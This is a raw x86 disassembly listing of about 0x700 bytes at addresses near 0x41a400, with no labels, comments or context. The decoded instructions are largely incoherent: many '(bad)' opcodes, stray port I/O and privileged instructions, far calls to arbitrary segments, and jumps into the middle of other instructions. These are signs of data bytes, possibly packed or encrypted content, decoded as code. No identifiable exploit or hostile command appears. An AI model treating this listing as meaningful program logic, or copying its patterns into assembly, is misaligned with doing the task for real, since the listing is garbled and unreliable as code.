  41a400:	and    BYTE PTR [edx-0x339f5ff3],al
  41a406:	cmp    bh,BYTE PTR [edi]
  41a408:	pushf  
  41a409:	popf   
  41a40a:	xor    ecx,DWORD PTR [ebp+0x63]
  41a40d:	push   ss
  41a40e:	ror    cl,cl
  41a410:	retf   0xa69b
  41a413:	sbb    DWORD PTR cs:[edi+esi*4+0x13],ebp
  41a418:	xor    esi,edx
  41a41a:	jmp    eax
  41a41c:	or     BYTE PTR [eax],ch
  41a41e:	ins    BYTE PTR es:[edi],dx
  41a41f:	sar    edi,1
  41a421:	call   0xaeb7:0xdb8a1ad9
  41a428:	cmp    edi,ebp
  41a42a:	mov    BYTE PTR [ebx-0x240a98f],al
  41a430:	jecxz  0x41a415
  41a432:	ficom  DWORD PTR [eax+0x59]
  41a435:	sub    cl,BYTE PTR [ebx-0x1308b554]
  41a43b:	pop    edx
  41a43c:	mov    edx,0xabcdd5a9
  41a441:	mov    WORD PTR [ebx],cs
  41a443:	mov    WORD PTR [eax-0x55],ds
  41a446:	jmp    0x758fb879
  41a44b:	scas   al,BYTE PTR es:[edi]
  41a44c:	adc    eax,0xe4d6af22
  41a451:	sbb    BYTE PTR [ebp+0x6720a3b0],0x63
  41a458:	popf   
  41a459:	jecxz  0x41a4c2
  41a45b:	pop    ebp
  41a45c:	xor    eax,0xa2844c0f
  41a461:	xchg   ecx,eax
  41a462:	push   es
  41a463:	sub    edx,DWORD PTR [eax+ecx*8]
  41a466:	sti    
  41a467:	test   eax,0xe98ec539
  41a46c:	ins    DWORD PTR es:[edi],dx
  41a46d:	mov    cl,0x2f
  41a46f:	(bad)
  41a472:	outs   dx,DWORD PTR ds:[esi]
  41a473:	mov    BYTE PTR [edi+0x39],ah
  41a476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a477:	push   ds
  41a478:	ret    0x2218
  41a47b:	dec    ebp
  41a47c:	inc    edi
  41a47d:	sbb    bh,BYTE PTR [esp+ecx*8-0x52e3408f]
  41a484:	sub    eax,0x6782f844
  41a489:	jne    0x41a4be
  41a48b:	push   eax
  41a48c:	jge    0x41a47c
  41a48e:	aam    0xf2
  41a490:	es sbb eax,0x64280f7d
  41a496:	push   es
  41a497:	xchg   ebp,eax
  41a498:	(bad)  
  41a499:	xlat   BYTE PTR ds:[ebx]
  41a49a:	pop    esi
  41a49b:	hlt    
  41a49c:	add    BYTE PTR [ebx-0x6ee4bfe2],bl
  41a4a2:	xchg   edi,eax
  41a4a3:	(bad)  
  41a4a4:	test   BYTE PTR [ecx],0x78
  41a4a7:	es inc ebx
  41a4a9:	ds int3 
  41a4ab:	not    DWORD PTR [esi+0x42]
  41a4ae:	pop    ebx
  41a4af:	lods   al,BYTE PTR ds:[esi]
  41a4b0:	sbb    al,BYTE PTR [edi]
  41a4b2:	retf   
  41a4b3:	jle    0x41a462
  41a4b5:	fwait
  41a4b6:	or     edx,DWORD PTR [ebx]
  41a4b8:	cmc    
  41a4b9:	shl    BYTE PTR [ebx+0x5b],0x89
  41a4bd:	sub    BYTE PTR [edi+ebp*4+0x193feed3],0xeb
  41a4c5:	inc    ebx
  41a4c6:	iret   
  41a4c7:	or     edx,esp
  41a4c9:	and    al,0x86
  41a4cb:	jmp    0x41a45b
  41a4cd:	popa   
  41a4ce:	xchg   BYTE PTR ds:0x92f57336,ch
  41a4d4:	mov    ebp,0xebd0d79c
  41a4d9:	cdq    
  41a4da:	push   0x5e
  41a4dc:	xchg   esp,eax
  41a4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4de:	xchg   BYTE PTR [ebx-0xc],bl
  41a4e1:	pop    edi
  41a4e2:	cmp    al,cl
  41a4e4:	(bad)  
  41a4e5:	xchg   ebx,eax
  41a4e6:	lea    ebx,[ecx]
  41a4e8:	ins    DWORD PTR es:[edi],dx
  41a4e9:	inc    esi
  41a4ea:	in     al,dx
  41a4eb:	xor    bh,BYTE PTR fs:0x9ff109f0
  41a4f2:	(bad)  
  41a4f3:	lahf   
  41a4f4:	mov    edi,0xa1cacc7e
  41a4f9:	aam    0xec
  41a4fb:	loope  0x41a541
  41a4fd:	call   0xbdf11c77
  41a502:	repz hlt 
  41a504:	mov    ds:0xa57348d2,eax
  41a509:	mov    eax,0xa04ffb52
  41a50e:	outs   dx,DWORD PTR ds:[esi]
  41a50f:	lods   eax,DWORD PTR ds:[esi]
  41a510:	shr    BYTE PTR [edi],0xe0
  41a513:	sar    BYTE PTR [edx-0x3ff5a334],1
  41a519:	inc    ebp
  41a51a:	mov    bl,0x27
  41a51c:	push   ebp
  41a51d:	xor    eax,0x10cf50a7
  41a522:	rol    ebx,1
  41a524:	aam    0x43
  41a526:	cld    
  41a527:	add    eax,0x3a26826b
  41a52c:	sub    DWORD PTR [ebx+0x8],edi
  41a52f:	dec    ebp
  41a530:	fstp   QWORD PTR [ebx+0x53e0d95a]
  41a536:	cmp    al,0xf6
  41a538:	arpl   WORD PTR [edi-0x6c],cx
  41a53b:	mov    ecx,0xf2933708
  41a540:	leave  
  41a541:	sti    
  41a542:	push   0xd7240446
  41a547:	mov    DWORD PTR [edx],0x733d4f71
  41a54d:	stos   DWORD PTR es:[edi],eax
  41a54e:	into   
  41a54f:	in     al,dx
  41a550:	int    0xf9
  41a552:	addr16 inc ebp
  41a554:	push   cs
  41a555:	jle    0x41a53b
  41a557:	or     BYTE PTR [ecx],bh
  41a559:	aam    0x8c
  41a55b:	jbe    0x41a57b
  41a55d:	ret    
  41a55e:	cmp    DWORD PTR [ebx],ebp
  41a560:	xchg   ecx,eax
  41a561:	enter  0x9b9e,0x39
  41a565:	mov    cl,dh
  41a567:	mov    ebx,0x444b3c24
  41a56c:	outs   dx,DWORD PTR ds:[esi]
  41a56d:	cmp    BYTE PTR [ebx+0x4a],0x9c
  41a571:	jb     0x41a57c
  41a573:	jge    0x41a5bb
  41a575:	or     dh,BYTE PTR [ebp-0x7bb9f26c]
  41a57b:	(bad)
  41a57f:	inc    esp
  41a580:	jl     0x41a507
  41a582:	icebp  
  41a583:	ficomp WORD PTR [eax+0xf6f2655]
  41a589:	in     eax,dx
  41a58a:	and    BYTE PTR [ebp-0x21],al
  41a58d:	cmp    BYTE PTR [esi+0x10],cl
  41a590:	jl     0x41a55d
  41a592:	mov    gs,WORD PTR [ebp-0x24]
  41a595:	stos   BYTE PTR es:[edi],al
  41a596:	inc    esi
  41a597:	dec    ecx
  41a598:	add    eax,0x86b5b5a3
  41a59d:	pop    ss
  41a59e:	mov    ss,WORD PTR [ecx]
  41a5a0:	out    dx,eax
  41a5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a2:	bound  eax,QWORD PTR [eax+0x12]
  41a5a5:	adc    ch,BYTE PTR [ecx+0x3218fdd4]
  41a5ab:	out    dx,eax
  41a5ac:	xchg   edx,eax
  41a5ad:	push   eax
  41a5ae:	out    0x57,al
  41a5b0:	ins    DWORD PTR es:[edi],dx
  41a5b1:	pop    esp
  41a5b2:	popa   
  41a5b3:	lea    esp,ds:0xa3d6f104
  41a5b9:	xor    ch,dh
  41a5bb:	mov    esi,0xadd74c16
  41a5c0:	fist   WORD PTR [edx+0xc]
  41a5c3:	fidivr DWORD PTR [esi-0x36]
  41a5c6:	cli    
  41a5c7:	xchg   cl,dl
  41a5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ca:	sar    DWORD PTR [edx+ecx*4+0x2596fdac],1
  41a5d1:	jmp    0x48aebc88
  41a5d6:	clc    
  41a5d7:	cmp    ch,BYTE PTR [esi]
  41a5d9:	popf   
  41a5da:	loope  0x41a57a
  41a5dc:	jl     0x41a5db
  41a5de:	push   ebp
  41a5df:	ret    
  41a5e0:	inc    esi
  41a5e1:	mov    bl,0xd7
  41a5e3:	js     0x41a572
  41a5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e6:	(bad)  
  41a5e7:	test   BYTE PTR [ebp-0x2e],0xbb
  41a5eb:	imul   ebx,DWORD PTR [esi+0x727a763c],0x20
  41a5f2:	jmp    0x41a65d
  41a5f4:	jge    0x41a5dd
  41a5f6:	push   ds
  41a5f7:	xor    BYTE PTR [edi-0x12],ch
  41a5fa:	ja     0x41a65f
  41a5fc:	pop    edx
  41a5fd:	push   ss
  41a5fe:	nop    DWORD PTR [ebp+0x461e3d4b]
  41a605:	inc    eax
  41a606:	(bad)  
  41a607:	push   eax
  41a608:	bound  ebp,QWORD PTR [ebx]
  41a60a:	nop
  41a60b:	enter  0x5a0,0xc9
  41a60f:	sar    cl,cl
  41a611:	loop   0x41a67c
  41a613:	scas   al,BYTE PTR es:[edi]
  41a614:	dec    esi
  41a615:	ins    DWORD PTR es:[edi],dx
  41a616:	mov    edx,0x65520668
  41a61b:	in     eax,dx
  41a61c:	in     eax,0x37
  41a61e:	xchg   edx,eax
  41a61f:	sub    eax,0x287d122e
  41a624:	out    0x9f,al
  41a626:	fiadd  WORD PTR [ecx-0x77a0d748]
  41a62c:	test   BYTE PTR [ecx+edx*4+0x46],bl
  41a630:	mov    ch,0xb4
  41a632:	or     edi,edx
  41a634:	sub    esi,DWORD PTR [ecx]
  41a636:	jae    0x41a676
  41a638:	data16 rcl BYTE PTR [esi+0x7c],cl
  41a63c:	(bad)  
  41a63d:	cmc    
  41a63e:	sub    BYTE PTR [ecx],dl
  41a640:	xor    esi,DWORD PTR es:[ecx+0x1fd723ee]
  41a647:	push   eax
  41a648:	test   eax,0xd4e68c0b
  41a64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64e:	dec    eax
  41a64f:	rcl    cl,0x1b
  41a652:	lods   eax,DWORD PTR ds:[esi]
  41a653:	inc    edx
  41a654:	inc    edx
  41a655:	retf   0x6525
  41a658:	std    
  41a659:	pop    esp
  41a65a:	push   esp
  41a65b:	pusha  
  41a65c:	test   BYTE PTR [edi-0x2f],ah
  41a65f:	cdq    
  41a660:	jmp    0xaf44:0x7133f04a
  41a667:	push   ds
  41a668:	shl    edx,1
  41a66a:	dec    eax
  41a66c:	out    0x4e,eax
  41a66e:	leave  
  41a66f:	xlat   BYTE PTR ds:[ebx]
  41a670:	inc    eax
  41a671:	dec    eax
  41a672:	outs   dx,BYTE PTR ds:[esi]
  41a673:	scas   eax,DWORD PTR es:[edi]
  41a674:	repz sub al,0xae
  41a677:	fisttp DWORD PTR [edi-0xa]
  41a67a:	fmul   QWORD PTR [edi]
  41a67c:	cwde   
  41a67d:	push   ecx
  41a67e:	iret   
  41a67f:	xchg   edx,eax
  41a680:	sub    ah,BYTE PTR [ebx+0x7f98fe6b]
  41a686:	call   DWORD PTR [ecx]
  41a688:	sub    edi,ebx
  41a68a:	ds imul edx,edi,0xede0ceb3
  41a691:	pop    DWORD PTR [esp+ebp*2+0x62]
  41a695:	fucompp 
  41a697:	(bad)  
  41a698:	fmul   DWORD PTR [ebx+0x24]
  41a69b:	lods   al,BYTE PTR ds:[esi]
  41a69c:	xchg   ebp,eax
  41a69d:	(bad)  
  41a69e:	mov    ecx,DWORD PTR [edi+0x7c]
  41a6a1:	xchg   ecx,eax
  41a6a2:	fsubr  QWORD PTR [ecx+ebx*8-0x46]
  41a6a6:	(bad)  
  41a6a7:	and    eax,0xec313976
  41a6ac:	jae    0x41a6ee
  41a6ae:	popa   
  41a6af:	fldcw  WORD PTR [edx+ecx*1]
  41a6b2:	lock bound esp,QWORD PTR [ebp+0x11]
  41a6b6:	lods   al,BYTE PTR ds:[esi]
  41a6b7:	and    BYTE PTR [eax],0xdd
  41a6ba:	push   esp
  41a6bb:	and    BYTE PTR [ebx],dl
  41a6bd:	out    dx,eax
  41a6be:	test   DWORD PTR [edi-0x16fdddc],ebp
  41a6c4:	cmp    al,0x30
  41a6c6:	popa   
  41a6c7:	jae    0x41a6f5
  41a6c9:	pushf  
  41a6ca:	push   ebx
  41a6cb:	in     eax,0x61
  41a6cd:	ror    BYTE PTR [eax+0x2120f476],cl
  41a6d3:	or     DWORD PTR [ebp+0x73],esi
  41a6d6:	loop   0x41a756
  41a6d8:	int3   
  41a6d9:	inc    esi
  41a6da:	adc    al,0xb6
  41a6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6dd:	jle    0x41a6e5
  41a6df:	xchg   esp,eax
  41a6e0:	jbe    0x41a6d7
  41a6e2:	cmp    ch,BYTE PTR [edx+0x10906f97]
  41a6e8:	push   esi
  41a6e9:	daa    
  41a6ea:	dec    ebx
  41a6eb:	dec    esi
  41a6ec:	sub    eax,0x710446a1
  41a6f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6f2:	(bad)  
  41a6f3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41a6f5:	push   ecx
  41a6f6:	and    BYTE PTR [ebx+ebp*4-0x30],0x48
  41a6fb:	xchg   DWORD PTR [eax-0x28af3103],ebx
  41a701:	cli    
  41a702:	pusha  
  41a703:	adc    ah,BYTE PTR [esi+edi*4]
  41a706:	add    cl,BYTE PTR [edx+0x3c8d2ec9]
  41a70c:	adc    DWORD PTR [edi+0x3b9a2086],ecx
  41a712:	cmp    esp,DWORD PTR [eax]
  41a714:	cmp    al,0xf7
  41a716:	lar    esi,WORD PTR [edx-0x23]
  41a71a:	pop    ebx
  41a71b:	xchg   ecx,eax
  41a71c:	(bad)  
  41a71d:	push   ebp
  41a71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71f:	mov    edx,DWORD PTR [esi-0x70384f5d]
  41a725:	imul   DWORD PTR [ecx]
  41a727:	push   es
  41a728:	cmp    BYTE PTR [edx+0x31],ah
  41a72b:	jnp    0x41a799
  41a72d:	mov    BYTE PTR [edx],bh
  41a72f:	push   ecx
  41a730:	sub    eax,0x479e74f3
  41a735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a736:	mov    ebx,0xcc117cae
  41a73b:	cmp    cl,BYTE PTR [edi-0x18]
  41a73e:	rcl    ebp,1
  41a740:	dec    edi
  41a741:	push   cs
  41a742:	pop    ss
  41a743:	mov    ah,0x22
  41a745:	and    DWORD PTR [eax],ecx
  41a747:	nop
  41a748:	xchg   esp,eax
  41a749:	inc    edi
  41a74a:	sbb    DWORD PTR [ebp+0x2d282640],edi
  41a750:	sar    BYTE PTR [ebx+0x451e0106],0xe9
  41a757:	mov    edx,ebx
  41a759:	(bad)  
  41a75a:	loope  0x41a748
  41a75c:	adc    BYTE PTR ss:[ecx+0x70],ch
  41a760:	cdq    
  41a761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a762:	jecxz  0x41a7df
  41a764:	mov    dh,0xce
  41a766:	pop    ds
  41a767:	add    DWORD PTR [edx-0x4a],ebx
  41a76a:	inc    esi
  41a76b:	jns    0x41a770
  41a76d:	out    dx,al
  41a76e:	stos   DWORD PTR es:[edi],eax
  41a76f:	fs push edx
  41a772:	xchg   edi,eax
  41a773:	mov    eax,0x7a085ce1
  41a778:	and    ebx,edx
  41a77a:	inc    eax
  41a77b:	or     al,ch
  41a77d:	ret    
  41a77e:	test   eax,0xc8ff9aa3
  41a783:	fdiv   st(1),st
  41a785:	pop    ebx
  41a786:	aas    
  41a787:	add    al,0xf0
  41a789:	add    al,0x86
  41a78b:	dec    esp
  41a78c:	lahf   
  41a78d:	push   ecx
  41a78e:	and    eax,0x61b4ed44
  41a793:	sbb    DWORD PTR [eax-0x1c],edx
  41a796:	clc    
  41a797:	rcr    DWORD PTR [esi+0x572dc734],0xf9
  41a79e:	jnp    0x41a7c9
  41a7a0:	jae    0x41a76a
  41a7a2:	mov    al,ds:0x1df3533f
  41a7a7:	inc    ebp
  41a7a8:	daa    
  41a7a9:	cwde   
  41a7aa:	mov    edx,DWORD PTR [esp+ebx*1]
  41a7ad:	add    ebx,DWORD PTR [esi+ebx*1]
  41a7b0:	mov    cl,0x5b
  41a7b2:	cs (bad) 
  41a7b5:	je     0x41a7c8
  41a7b7:	dec    ebx
  41a7b8:	int3   
  41a7b9:	mov    eax,ds:0x747aa5ff
  41a7be:	int    0x7c
  41a7c0:	int    0x8e
  41a7c2:	imul   ebp,DWORD PTR [ecx+0x55cfd70c],0xffffffff
  41a7c9:	out    0x4a,al
  41a7cb:	add    al,0x74
  41a7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ce:	cwde   
  41a7cf:	sbb    al,BYTE PTR [ebp+0x4a]
  41a7d2:	xor    BYTE PTR [edx],bl
  41a7d4:	xchg   edx,eax
  41a7d5:	adc    DWORD PTR ds:0x786bc131,0x36035166
  41a7df:	mov    ch,0x5c
  41a7e1:	es jnp 0x41a82b
  41a7e4:	push   edi
  41a7e5:	cs or  ebp,ebp
  41a7e8:	mov    cl,0x99
  41a7ea:	(bad)  
  41a7eb:	loop   0x41a7c8
  41a7ed:	sbb    al,0x3
  41a7ef:	dec    esp
  41a7f0:	sub    DWORD PTR [edx],esp
  41a7f2:	sub    DWORD PTR [edx+0x31],ebp
  41a7f5:	pop    esi
  41a7f6:	frstor [esi-0x28]
  41a7f9:	pusha  
  41a7fa:	xchg   esp,eax
  41a7fb:	or     DWORD PTR [ebx],edx
  41a7fd:	fidiv  WORD PTR [eax-0x2c]
  41a800:	sub    bh,BYTE PTR [eax]
  41a802:	gs push edi
  41a804:	pop    edx
  41a805:	cld    
  41a806:	je     0x41a7c4
  41a808:	ja     0x41a790
  41a80a:	into   
  41a80b:	or     edi,DWORD PTR [ecx]
  41a80d:	push   eax
  41a80e:	sub    ah,cl
  41a810:	mov    eax,0x602d6a4a
  41a815:	daa    
  41a816:	push   cs
  41a817:	int3   
  41a818:	push   ebp
  41a819:	stc    
  41a81a:	scas   eax,DWORD PTR es:[edi]
  41a81b:	jae    0x41a7bf
  41a81d:	and    BYTE PTR [esp+ebx*4],dh
  41a820:	aas    
  41a821:	retf   0x227e
  41a824:	mov    ds:0x106ba47a,al
  41a829:	add    DWORD PTR [eax],eax
  41a82b:	les    ebp,FWORD PTR [esi-0x1b]
  41a82e:	inc    esi
  41a82f:	push   eax
  41a830:	xlat   BYTE PTR ds:[ebx]
  41a831:	clc    
  41a832:	std    
  41a833:	inc    ecx
  41a834:	out    0xaa,eax
  41a836:	mov    ebp,cs
  41a838:	lahf   
  41a839:	loope  0x41a7fe
  41a83b:	mov    eax,0x2eb467a7
  41a840:	jge    0x41a85c
  41a842:	jne    0x41a830
  41a844:	stc    
  41a845:	pop    ebp
  41a846:	sahf   
  41a847:	es data16 hlt 
  41a84a:	outs   dx,BYTE PTR ds:[esi]
  41a84b:	outs   dx,DWORD PTR ds:[esi]
  41a84c:	sbb    bh,BYTE PTR [esp+eiz*4-0x71144ad3]
  41a853:	push   ss
  41a854:	in     eax,dx
  41a855:	js     0x41a866
  41a857:	scas   al,BYTE PTR es:[edi]
  41a858:	adc    BYTE PTR [ebp-0x3f3e5efb],ah
  41a85e:	xchg   ecx,eax
  41a85f:	clc    
  41a860:	xor    eax,0x9f000891
  41a865:	inc    ebp
  41a866:	call   0xb7d0ae4c
  41a86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a86c:	and    BYTE PTR [esi-0x57],cl
  41a86f:	out    0x64,eax
  41a871:	xchg   ebp,eax
  41a872:	arpl   WORD PTR [edx],di
  41a874:	rol    DWORD PTR [ebx-0x51],cl
  41a877:	jne    0x41a873
  41a879:	(bad)  [edx]
  41a87b:	shl    dl,cl
  41a87d:	and    al,BYTE PTR [esi]
  41a87f:	fs cwde 
  41a881:	std    
  41a882:	fsubr  DWORD PTR [ebx+eiz*4-0x7c]
  41a886:	sub    al,0xbf
  41a888:	dec    ebp
  41a889:	sub    eax,0xe599995
  41a88e:	push   eax
  41a88f:	cmc    
  41a890:	shr    edx,0x60
  41a893:	pop    eax
  41a894:	mov    gs,WORD PTR [edi-0x23ad8d1]
  41a89a:	sub    al,0xe6
  41a89c:	(bad)  
  41a89d:	or     al,0x9
  41a89f:	sub    cl,0x87
  41a8a2:	daa    
  41a8a3:	pop    es
  41a8a4:	adc    BYTE PTR [ebx-0x78],al
  41a8a7:	or     eax,0xe416ab95
  41a8ac:	or     dl,al
  41a8ae:	sub    cl,BYTE PTR [edx-0x32]
  41a8b1:	lds    esp,FWORD PTR [ebp-0x60b267b1]
  41a8b7:	ss iret 
  41a8b9:	or     DWORD PTR [edi+ebx*4],eax
  41a8bc:	(bad)  
  41a8bd:	fstp   TBYTE PTR [esi+0x6ea80df9]
  41a8c3:	jne    0x41a90c
  41a8c5:	push   esp
  41a8c6:	not    BYTE PTR [ecx+0x40801297]
  41a8cc:	cwde   
  41a8cd:	xor    ebp,ecx
  41a8cf:	stc    
  41a8d0:	sbb    BYTE PTR [ecx+0x62d3ca3f],0x91
  41a8d7:	mov    ch,0x5e
  41a8d9:	jae    0x41a871
  41a8db:	div    BYTE PTR [ebx+0x4e324fde]
  41a8e1:	sub    eax,0x8ae246f2
  41a8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8e7:	(bad)  
  41a8e8:	fimul  DWORD PTR [ebp-0x37e025af]
  41a8ee:	ret    
  41a8ef:	cli    
  41a8f0:	jg     0x41a8f2
  41a8f2:	dec    ebp
  41a8f3:	test   DWORD PTR [edi-0x12],eax
  41a8f6:	sbb    BYTE PTR [ecx-0x9],cl
  41a8f9:	or     al,BYTE PTR [esi]
  41a8fb:	inc    esi
  41a8fc:	xlat   BYTE PTR ds:[ebx]
  41a8fd:	jecxz  0x41a88c
  41a8ff:	inc    esi
  41a900:	in     eax,dx
  41a901:	(bad)  
  41a902:	sub    DWORD PTR [edi+ebx*8-0x7e99dd78],ebp
  41a909:	loop   0x41a8db
  41a90b:	ffreep st(2)
  41a90d:	xchg   BYTE PTR [edx+0x5c],cl
  41a910:	int3   
  41a911:	mov    ch,0xd8
  41a913:	pop    ebp
  41a914:	out    0x9a,al
  41a916:	or     al,0x8f
  41a918:	xchg   edi,eax
  41a919:	clc    
  41a91a:	xchg   ebp,eax
  41a91b:	cs outs dx,DWORD PTR ds:[esi]
  41a91e:	sub    esp,DWORD PTR [ebx]
  41a920:	xor    al,0xb8
  41a922:	not    BYTE PTR [ebx+0x1cc1655]
  41a928:	add    dh,dl
  41a92a:	mov    ds:0x530f8e61,al
  41a92f:	sub    al,0x4c
  41a931:	xor    al,0xf3
  41a933:	cmp    edx,DWORD PTR [esi+0x3]
  41a936:	sbb    eax,0xa2b2f600
  41a93b:	ror    DWORD PTR [ebx-0x3e],1
  41a93e:	push   ds
  41a93f:	mov    ch,0x1
  41a941:	std    
  41a942:	add    eax,0x568df278
  41a947:	rol    bl,1
  41a949:	test   eax,0x226ae304
  41a94e:	pop    ebx
  41a94f:	cs dec edi
  41a951:	loopne 0x41a957
  41a953:	mov    ds:0x7fb7b6ae,al
  41a958:	test   DWORD PTR [esi+0x7b28198e],0xcda66f6c
  41a962:	adc    dl,bl
  41a964:	adc    eax,0x88a8efdf
  41a969:	sbb    al,0xc7
  41a96b:	or     ebp,DWORD PTR [edi+0x7c]
  41a96e:	std    
  41a96f:	fnstcw WORD PTR [edi+0x3]
  41a972:	js     0x41a913
  41a974:	pop    esi
  41a975:	test   eax,0x531ccbb1
  41a97a:	adc    edi,DWORD PTR [ebp+0x64]
  41a97d:	jg     0x41a944
  41a97f:	sub    al,0xf5
  41a981:	fild   DWORD PTR [esi]
  41a983:	loop   0x41a9d2
  41a985:	pusha  
  41a986:	jb     0x41a993
  41a988:	fmulp  st(6),st
  41a98a:	call   0xcbda:0x444ac758
  41a991:	or     DWORD PTR [ecx],ebx
  41a993:	int3   
  41a994:	dec    ebp
  41a995:	lock scas eax,DWORD PTR es:[edi]
  41a997:	xor    dl,bl
  41a999:	push   0x97773e0
  41a99e:	cmp    edx,ecx
  41a9a0:	adc    al,0xad
  41a9a2:	aam    0x35
  41a9a4:	shl    BYTE PTR [ebx+0x13fce672],0x87
  41a9ab:	pop    esi
  41a9ac:	jbe    0x41a9f8
  41a9ae:	mov    ebx,es
  41a9b0:	pop    ebx
  41a9b1:	mov    ecx,0x59555210
  41a9b6:	cli    
  41a9b7:	rcl    DWORD PTR [ebp+0x4e],0x5f
  41a9bb:	sahf   
  41a9bc:	stos   BYTE PTR es:[edi],al
  41a9bd:	and    eax,0xaab2326d
  41a9c2:	jo     0x41a992
  41a9c4:	sub    ecx,esi
  41a9c6:	mov    cl,0xa6
  41a9c8:	icebp  
  41a9c9:	rcr    DWORD PTR [eax],0x8e
  41a9cc:	xchg   edi,eax
  41a9cd:	add    BYTE PTR [edx-0x301a9af1],cl
  41a9d3:	sub    ah,BYTE PTR [eax-0x36]
  41a9d6:	cmp    eax,0x98599a8d
  41a9db:	push   ebp
  41a9dc:	jmp    FWORD PTR ds:0x2e43b43c
  41a9e2:	jecxz  0x41aa56
  41a9e4:	aas    
  41a9e5:	pop    edi
  41a9e6:	(bad)  
  41a9e7:	cs dec edx
  41a9e9:	loop   0x41a98f
  41a9eb:	mov    ah,0x0
  41a9ed:	dec    ebx
  41a9ee:	mov    ebx,0x278d8172
  41a9f3:	xchg   DWORD PTR [ecx+ebp*2+0x22],edi
  41a9f7:	xchg   ebx,edi
  41a9f9:	and    esp,DWORD PTR es:[esi-0x11]
  41a9fd:	xchg   esi,eax
  41a9fe:	cmp    eax,0x50d8973f
  41aa03:	xchg   esi,eax
  41aa04:	or     cl,BYTE PTR [edi-0x6d1ed3]
  41aa0a:	imul   eax,eax,0x35e2c15d
  41aa10:	mov    edi,0x301eb569
  41aa15:	shr    DWORD PTR [edx+eax*2],0x50
  41aa19:	aas    
  41aa1a:	dec    eax
  41aa1b:	leave  
  41aa1c:	push   ebx
  41aa1d:	adc    ebp,ebx
  41aa1f:	ja     0x41aa7e
  41aa21:	test   al,0x86
  41aa23:	shl    BYTE PTR [ebx-0x6102587],cl
  41aa29:	mov    ch,dl
  41aa2b:	mov    ah,0xe8
  41aa2d:	inc    esp
  41aa2e:	push   edi
  41aa2f:	xchg   BYTE PTR [edi],bl
  41aa31:	cli    
  41aa32:	clc    
  41aa33:	clc    
  41aa34:	mov    eax,ds:0x7a2d726b
  41aa39:	adc    edi,DWORD PTR [esi-0x43354822]
  41aa3f:	cmp    DWORD PTR [edi+0x30],0xf97af3e9
  41aa46:	or     ebx,DWORD PTR [edi+0x5e8d970f]
  41aa4c:	push   cs
  41aa4d:	mov    ds:0x58fb0a55,eax
  41aa52:	cdq    
  41aa53:	jmp    0x41aac2
  41aa55:	pop    esp
  41aa56:	retf   
  41aa57:	outs   dx,BYTE PTR ds:[esi]
  41aa58:	cs ja  0x41aa6d
  41aa5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa5c:	in     al,0x2f
  41aa5e:	pop    ss
  41aa5f:	fwait
  41aa60:	std    
  41aa61:	lods   al,BYTE PTR ds:[esi]
  41aa62:	scas   eax,DWORD PTR es:[edi]
  41aa63:	mov    eax,ds:0x27f23017
  41aa68:	push   0x1e59ed16
  41aa6d:	lods   eax,DWORD PTR ds:[esi]
  41aa6e:	mov    bl,0x14
  41aa70:	fmulp  st(4),st
  41aa72:	add    al,0xd1
  41aa74:	daa    
  41aa75:	mov    WORD PTR [edx],es
  41aa77:	mov    bh,0x8b
  41aa79:	cmp    eax,DWORD PTR [ecx-0x3b1a48fe]
  41aa7f:	adc    bl,BYTE PTR [edx-0x35]
  41aa82:	ret    0xb3b
  41aa85:	mov    ebx,0xcdae38c1
  41aa8a:	ins    DWORD PTR es:[edi],dx
  41aa8b:	adc    DWORD PTR [ebp+0x14],edi
  41aa8e:	into   
  41aa8f:	add    al,0x86
  41aa91:	loope  0x41aaa3
  41aa93:	ret    
  41aa94:	push   0x271c29bd
  41aa99:	jp     0x41aab5
  41aa9b:	cbw    
  41aa9d:	sbb    BYTE PTR [ebp+0x4748176f],0x51
  41aaa4:	mov    ch,0xd1
  41aaa6:	inc    edi
  41aaa7:	mov    esp,0x3cb32b00
  41aaac:	dec    ebp
  41aaad:	fwait
  41aaae:	sub    eax,0xf0984039
  41aab3:	leave  
  41aab4:	(bad)  
  41aab5:	dec    esp
  41aab6:	adc    DWORD PTR [ebp+0x66723058],edi
  41aabc:	push   ds
  41aabd:	jns    0x41aab0
  41aabf:	sahf   
  41aac0:	fst    DWORD PTR [ebx+0x6ada8a59]
  41aac6:	ret    
  41aac7:	add    al,0x1e
  41aac9:	out    0xf4,al
  41aacb:	dec    edi
  41aacc:	popf   
  41aacd:	nop
  41aace:	out    0xc4,al
  41aad0:	xchg   edi,eax
  41aad1:	sbb    ebp,esi
  41aad3:	mov    edx,0x44e27d69
  41aad8:	sub    ebp,esp
  41aada:	ret    0x84f5
  41aadd:	jb     0x41aaee
  41aadf:	aad    0x30
  41aae1:	inc    esp
  41aae2:	shl    DWORD PTR [eax-0x6dcaa1df],1
  41aae8:	jge    0x41aaf9
  41aaea:	push   ds
  41aaeb:	add    edx,DWORD PTR [edx+0x2d]
  41aaee:	aam    0x77
  41aaf0:	leave  
  41aaf1:	mov    dl,0xd3
  41aaf3:	das    
  41aaf4:	add    bl,dl
  41aaf6:	pusha  
  41aaf7:	sub    eax,0xeab5964c
  41aafc:	or     eax,0x97bd9aee
  41ab01:	mov    eax,ds:0xabf8f380
  41ab06:	xor    eax,0xb53de51c
  41ab0b:	ret    0x74d4
  41ab0e:	sub    edx,DWORD PTR [edi+0x20]
  41ab11:	pushf  
  41ab12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab13:	daa    
  41ab14:	push   ds
  41ab15:	call   0x4262:0x82373313
  41ab1c:	or     DWORD PTR [ecx],edx
  41ab1e:	shr    DWORD PTR [ebp-0x7c],0x41
